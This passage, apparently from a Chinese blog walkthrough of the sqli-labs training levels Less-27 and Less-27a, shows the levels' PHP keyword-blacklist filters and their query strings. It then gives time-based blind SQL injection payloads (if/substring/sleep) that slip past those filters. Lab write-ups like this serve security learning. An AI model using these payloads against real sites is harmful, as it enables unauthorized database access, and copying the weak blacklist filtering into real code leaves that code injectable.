<li>这题和Less-26区别不大只是在过滤函数添加了更多过滤规则。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Less-26</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out spaces</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                <span class="comment">//Strip out slashes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Less-27</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们只需要把Less-26的payload修改即可。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(if(substring(user(),1,1)=char(114),sleep(3),0))=&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-27a与SELECT-amp-UNION的绕过"><a href="#Less-27a与SELECT-amp-UNION的绕过" class="headerlink" title="Less-27a与SELECT&amp;UNION的绕过"></a>Less-27a与SELECT&amp;UNION的绕过</h2><ul>
<li>Less-27a和Less-27两个题目的区别在于SQL语句不一样。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Less-27</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment"># Less-27a</span></span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> .<span class="variable">$id</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>Less-27使用单引号，Less-27a使用双引号。</li>
<li>这里我们只需要把Less-27的payload修改即可。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&quot;and(if(substring(user(),1,1)=char(114),sleep(3),0))=&quot;</span><br></pre></td></tr></table></figure>

</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/04/02/Linux/%E4%BA%A4%E5%8F%89%E7%BC%96%E7%A8%8B/">prev</a><a class="next" href="/2021/05/26/CTF/Web32%20WriteUp/">next</a></div><div class="copyright"><p>&copy; 2022 <a href="http://webb-l.top">Webb</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
    Barba.Pjax.start()
})</script></body></html>